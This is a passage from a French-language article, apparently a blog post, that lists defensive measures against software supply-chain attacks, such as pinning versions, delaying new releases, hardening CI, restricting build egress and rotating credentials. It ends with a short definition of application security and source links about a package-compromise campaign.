- **Épinglez les versions exactes et commitez les lockfiles**, partout, y
  compris les actions de CI par SHA de commit plutôt que par tag. Un tag flottant
  est un accès en écriture à votre pipeline offert à quelqu'un d'autre.
- **Imposez un délai de carence sur les nouvelles versions.** La plupart des
  versions malveillantes sont détectées et retirées en quelques heures à
  quelques jours. Une politique du type « aucune version de moins de N jours
  dans un build » aurait bloqué toute cette campagne pour un coût d'ingénierie
  nul. C'est le contrôle au meilleur rapport valeur/effort de cette liste.
- **Traitez la CI comme de la production.** Jetons au moindre privilège, pas de
  `pull_request_target` sur des entrées non fiables, OIDC à portée restreinte, et
  lint des workflows avec quelque chose comme `zizmor`. Le runner détient les
  identifiants de tout.
- **Restreignez les sorties réseau des builds.** Une étape de build qui peut
  joindre une IP arbitraire est une étape de build qui peut exfiltrer. Mettre
  vos registres en liste d'autorisation casse le second étage même quand le
  premier a réussi.
- **Exigez et vérifiez la provenance.** Les attestations et la publication de
  confiance relient un artefact au pipeline qui l'a produit — la réponse directe
  au problème SolarWinds, aujourd'hui largement disponible et toujours largement
  inutilisée.
- **Planifiez la rotation, à l'avance.** La remédiation à « on l'a importé »
  n'est pas une montée de version. C'est la rotation de tous les identifiants
  qui existaient dans cet environnement, et vous voulez savoir combien de temps
  cela prend *avant* d'en avoir besoin.
- **Surveillez le comportement, pas seulement l'inventaire.** Rien de statique
  n'allait attraper la 2.4.6. Un build qui joint une IP inconnue est un signal
  qui ne dépend d'aucune base de vulnérabilités à jour.

## Alors, c'est quoi ce métier, en un paragraphe

L'Application Security est la fonction qui fait du code sûr le chemin de moindre
résistance pour tous les autres. Elle intervient assez tôt dans la conception
pour changer la forme du système, fait tourner l'outillage qui attrape ce qui se
généralise, absorbe le bruit de cet outillage pour que les développeurs n'aient
jamais à le subir, convertit les survivants en travail priorisé lors d'une
réunion où elle arrive avec des correctifs plutôt qu'avec des exigences, garde
l'ensemble dans un seul système pour que « est-ce qu'on s'améliore » ait une
réponse défendable auprès des ingénieurs comme du conseil d'administration, et
maintient un modèle vivant de la façon dont le code qui n'a jamais été écrit en
interne entre chez vous et de ce qu'il peut atteindre une fois entré.

Les scanners sont le ticket d'entrée. **Le jugement, c'est le métier.**

---

Sources pour la section sur la chaîne d'approvisionnement :
[l'analyse de la campagne par SafeDep](https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/),
[le décryptage de la compromission Mistral PyPI par Raven](https://raven.io/blog/the-mistral-compromise),
[The Hacker News sur Mini Shai-Hulud](https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html),
et [les avis de sécurité de Mistral](https://docs.mistral.ai/resources/security-advisories).
